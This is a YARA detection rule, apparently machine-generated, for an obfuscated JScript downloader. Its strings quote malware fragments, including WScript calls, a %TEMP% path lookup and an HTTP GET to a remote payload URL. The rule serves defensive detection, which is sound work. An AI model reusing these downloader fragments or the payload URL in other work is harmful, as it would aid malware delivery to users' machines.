rule sig_20160428_327a53011356ae6c0da56ff433cd53cf {
  meta:
    description = "datamaliciousorder - file 20160428_327a53011356ae6c0da56ff433cd53cf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d918770daa795e3a53d6a002cfd1902deb46ca81455e4de041ae5b3a4d51c364"

  strings:
    $s1  = "function PrjFqfHntXieQntSodEzz(IriGunUhiNkfLzbJwxZur){GgdLllLmbKuwElhIhnEoe[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function PmdRadDzqFelLksMnsSpd() {return GgdLllLmbKuwElhIhnEoe[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function PrjFqfHntXieQntSodEzz(IriGunUhiNkfLzbJwxZur){GgdLllLmbKuwElhIhnEoe[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var GgdLllLmbKuwElhIhnEoe = function AuqLvvErgHeuGjlOolRzu() {return EwmSveZbsFfvVbgAkmWkm[RgdWzeHnrSagEcnNzeHps](\"WScript\"+\"" ascii
    $s5  = "var GgdLllLmbKuwElhIhnEoe = function AuqLvvErgHeuGjlOolRzu() {return EwmSveZbsFfvVbgAkmWkm[RgdWzeHnrSagEcnNzeHps](\"WScript\"+\"" ascii
    $s6  = "function PmdRadDzqFelLksMnsSpd() {return GgdLllLmbKuwElhIhnEoe[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "NwkKdlDxuVysJmkSfpLod[AqzKgjIeaMziCleAemNwx](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s8  = "var EwmSveZbsFfvVbgAkmWkm = this[\"WScript\"];" fullword ascii
    $s9  = "if (NwkKdlDxuVysJmkSfpLod[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function RwlBxpAvxXnnUslThqEms(){return FmgTkdNfeDywXrgIkcTeg + \"\";};" fullword ascii
    $s11 = "function IyyGgjBdyPbkOuuAotDgw(UkvPqaGouAgcApbZxgPqb, BjyQrfMhtRyzNdhSgtRia){SkwEeiZnjHtbEjtJliXwq = SkwEeiZnjHtbEjtJliXwq * 1; " ascii
    $s12 = "return UkvPqaGouAgcApbZxgPqb - BjyQrfMhtRyzNdhSgtRia;};" fullword ascii
    $s13 = "function PqeVpgNayGjfXdfLyiSls() {return ((RhvCyuUqvFttAkwIobGoe == true) && (RhvCyuUqvFttAkwIobGoe == JkgDjmYgpBpbMceIywZvn)) ?" ascii
    $s14 = "function PqeVpgNayGjfXdfLyiSls() {return ((RhvCyuUqvFttAkwIobGoe == true) && (RhvCyuUqvFttAkwIobGoe == JkgDjmYgpBpbMceIywZvn)) ?" ascii
    $s15 = "function AdbKtsVtvLmaTzdSaeEvt(QotKrtIrqSscPovCovCys) {var HmpQhpPpzRouAqoVguYgd = (1, 2, 3, 4, 5, QotKrtIrqSscPovCovCys); retur" ascii
    $s16 = "var RhvCyuUqvFttAkwIobGoe = false;" fullword ascii
    $s17 = "}while (YwrBygXkeAwxSavFnyIrp);" fullword ascii
    $s18 = "function QgfNvgEwbQqcKwuVtbJcm(){return 23;};" fullword ascii
    $s19 = "return IyyGgjBdyPbkOuuAotDgw(1 == 1 ? VuiDwaGfvFhoAwzIqyYes : 0, 1 == 1 ? ImtDkxTtwWrvQruHjkWvi : 0);" fullword ascii
    $s20 = "JvoChaGydAkoAuyKdmQed = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}